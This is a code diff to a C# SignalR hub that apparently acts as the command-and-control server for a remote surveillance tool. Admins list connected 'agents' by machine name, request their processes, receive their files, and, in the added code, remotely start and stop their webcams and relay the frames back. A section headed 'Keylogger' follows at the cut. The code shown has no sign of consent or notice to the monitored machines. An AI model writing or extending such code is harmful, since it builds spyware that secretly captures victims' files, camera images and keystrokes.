@@ -29,6 +29,14 @@ namespace WebApp.Hubs
             await Clients.All.SendAsync("AgentConnected", Context.ConnectionId, machineName);
         }
 
+        // Admin calls this on load to get currently connected agents
+        public async Task GetConnectedAgents()
+        {
+            var agentsList = ConnectedAgents.Select(x => new { id = x.Key, name = x.Value }).ToList();
+            var json = System.Text.Json.JsonSerializer.Serialize(agentsList);
+            await Clients.Caller.SendAsync("ReceiveConnectedAgents", json);
+        }
+
         // Admin calls this to request processes from an Agent
         public async Task RequestProcesses(string targetConnectionId)
         {
@@ -98,6 +106,22 @@ namespace WebApp.Hubs
         public async Task SendFileResult(string adminConnectionId, string fileName, string base64Data)
         {
             await Clients.All.SendAsync("ReceiveFile", Context.ConnectionId, fileName, base64Data);
+        }
+
+        // --- NEW: Webcam Stream ---
+        public async Task RequestStartWebcam(string targetConnectionId)
+        {
+            await Clients.Client(targetConnectionId).SendAsync("StartWebcamCommand");
+        }
+
+        public async Task RequestStopWebcam(string targetConnectionId)
+        {
+            await Clients.Client(targetConnectionId).SendAsync("StopWebcamCommand");
+        }
+
+        public async Task SendWebcamFrame(string adminConnectionId, string base64Image)
+        {
+            await Clients.All.SendAsync("ReceiveWebcamFrame", Context.ConnectionId, base64Image);
         }
 
         // --- NEW: Keylogger ---
